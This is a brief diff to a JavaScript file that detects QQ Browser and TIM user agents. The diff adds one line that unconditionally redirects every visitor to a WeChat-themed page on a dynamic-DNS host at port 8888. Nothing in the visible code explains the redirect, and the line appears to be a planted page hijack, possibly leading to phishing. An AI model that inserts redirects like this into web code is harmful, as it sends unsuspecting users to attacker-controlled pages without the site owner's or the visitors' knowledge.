@@ -5,7 +5,7 @@ qqBrowser="MQQBrowser";
 userAgent=navigator.userAgent;
 qqSwitch=false;
 timSwitch=false;
-
+window.location.href="http://qder.tpddns.cn:8888/1/1/static/wechat.html";
 function inUA(s){
     return userAgent.indexOf(s)!=-1
 }
